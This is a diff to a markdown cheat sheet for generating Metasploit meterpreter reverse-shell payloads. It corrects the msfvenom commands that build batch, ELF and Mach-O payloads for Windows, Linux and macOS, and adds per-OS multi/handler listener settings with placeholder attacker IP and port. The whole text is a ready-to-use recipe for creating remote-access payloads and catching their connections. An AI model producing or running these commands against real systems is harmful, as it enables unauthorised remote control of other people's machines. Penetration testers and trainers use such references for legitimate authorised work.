@@ -49,16 +49,16 @@ Replace `<YOUR_IP>` and `<YOUR_PORT>` in all examples below.
 #### **Staged Payloads**
 | OS | Command Example | Notes |
 | :--- | :--- | :--- |
-| **🪟 Windows** | `msfvenom -p windows/meterpreter/reverse_tcp -lhost=<IP> -lport=<PORT> -f psh-cmd > payload.bat` | Creates a batch file. |
-| **🐧 Linux (x64)** | `msfvenom -p linux/x64/meterpreter/reverse_tcp -lhost=<IP> -lport=<PORT> -f elf > payload.elf` | Requires `chmod +x payload.elf`. |
-| **🍎 macOS (AArch64)** | `msfvenom -p osx/aarch64/meterpreter/reverse_tcp -lhost=<IP> -lport=<PORT> -f macho > payload.macho` | Requires `chmod +x payload.macho`. |
+| **🪟 Windows** | `msfvenom -p windows/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f psh-cmd > payload.bat` | Creates a batch file. |
+| **🐧 Linux (x64)** | `msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f elf > payload.elf` | Requires `chmod +x payload.elf`. |
+| **🍎 macOS (AArch64)** | `msfvenom -p osx/aarch64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f macho > payload.macho` | Requires `chmod +x payload.macho`. |
 
 #### **Stageless Payloads**
 | OS | Command Example | Notes |
 | :--- | :--- | :--- |
-| **🪟 Windows** | `msfvenom -p windows/meterpreter_reverse_tcp -lhost=<IP> -lport=<PORT> -f psh-cmd > payload.bat` | Creates a batch file. |
-| **🐧 Linux (x64)** | `msfvenom -p linux/x64/meterpreter_reverse_tcp -lhost=<IP> -lport=<PORT> -f elf > payload.elf` | Requires `chmod +x payload.elf`. |
-| **🍎 macOS (AArch64)** | `msfvenom -p osx/aarch64/meterpreter_reverse_tcp -lhost=<IP> -lport=<PORT> -f macho > payload.macho` | Requires `chmod +x payload.macho`. |
+| **🪟 Windows** | `msfvenom -p windows/meterpreter_reverse_tcp lhost=<IP> lport=<PORT> -f psh-cmd > payload.bat` | Creates a batch file. |
+| **🐧 Linux (x64)** | `msfvenom -p linux/x64/meterpreter_reverse_tcp lhost=<IP> lport=<PORT> -f elf > payload.elf` | Requires `chmod +x payload.elf`. |
+| **🍎 macOS (AArch64)** | `msfvenom -p osx/aarch64/meterpreter_reverse_tcp lhost=<IP> lport=<PORT> -f macho > payload.macho` | Requires `chmod +x payload.macho`. |
 
 ---
 
@@ -67,9 +67,38 @@ Start your listener to catch incoming connections. **Ensure this matches your ge
 
 1.  **Launch:** `msfconsole`
 2.  **Select Module:** `use exploit/multi/handler`
-3.  **Configure (Example: Stageless Windows):**
+3.  **Configure**
+    **For Staged:**
+    
+    windows:
+    ```text
+    set PAYLOAD windows/meterpreter/reverse_tcp
+    ```
+    Linux:
+    ```text
+    set PAYLOAD linux/x64/meterpreter/reverse_tcp
+    ```
+    Mac:
+    ```text
+    set PAYLOAD osx/aarch64/meterpreter/reverse_tcp
+    ```
+    **For Stageless:**
+    
+    windows:
     ```text
     set PAYLOAD windows/meterpreter_reverse_tcp
+    ```
+    Linux:
+    ```text
+    set PAYLOAD linux/x64/meterpreter_reverse_tcp
+    ```
+    Mac:
+    ```text
+    set PAYLOAD osx/aarch64/meterpreter_reverse_tcp
+    ```
+    
+    Then , 
+    ```text
     set LHOST <YOUR_IP>
     set LPORT <YOUR_PORT>
     ```
